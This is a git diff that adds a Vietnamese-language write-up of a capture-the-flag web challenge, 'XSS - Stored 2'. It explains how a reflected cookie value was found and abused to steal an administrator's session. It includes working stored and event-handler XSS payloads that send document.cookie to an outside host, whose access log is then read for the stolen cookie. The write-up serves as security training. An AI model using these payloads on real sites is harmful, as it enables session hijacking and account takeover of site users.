@@ -53,3 +53,19 @@ var token = groups[1];
 ``test' onmousemove='document.location="http://oceanmancuonh.site?cmd=".concat(document.cookie)``
 6. Vào access_log của server để có thể lấy được cookie có chứa flag.
 ![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/74394933-97c5-48f9-add3-1ef5c9f3488e)
+
+## XSS - Stored 2
+
+1. Ở bài này nhận thấy rằng input truyền vào ở title và message đều bị filter không thể inject xss được.
+2. Tuy nhiên nhận thấy khi thay đổi giá trị cookie status thì nó cũng reflect lại ở phần Posted messages.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/36fee880-5d29-41aa-b5af-ecee91de1c54)
+3. Inject thử xss vào với payload `"><script>alert(1)</script>` thì thấy thành công.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/06fbd079-8e1e-471b-94ca-09e2653253ab)
+4. Được biết sau khi gửi message thì admin sẽ đọc và dựa vào tiêu đề chal -> ta sẽ thực  hiện stored xss với payload sau để lấy cookie của admin.
+``"><script>document.location='http://oceanmancuonh.site?c='+document.cookie</script>``
+5. Vào access_log thì nhận thấy chúng ta có được admincoookie.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/f30cfa35-49b8-4c86-b50f-50495d8cda27)
+6. Thêm admincookie rồi vào endpoint session=admin thì nhận được flag.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a0bee487-2455-4b01-911f-5f2a91328bf3)
+
+## 
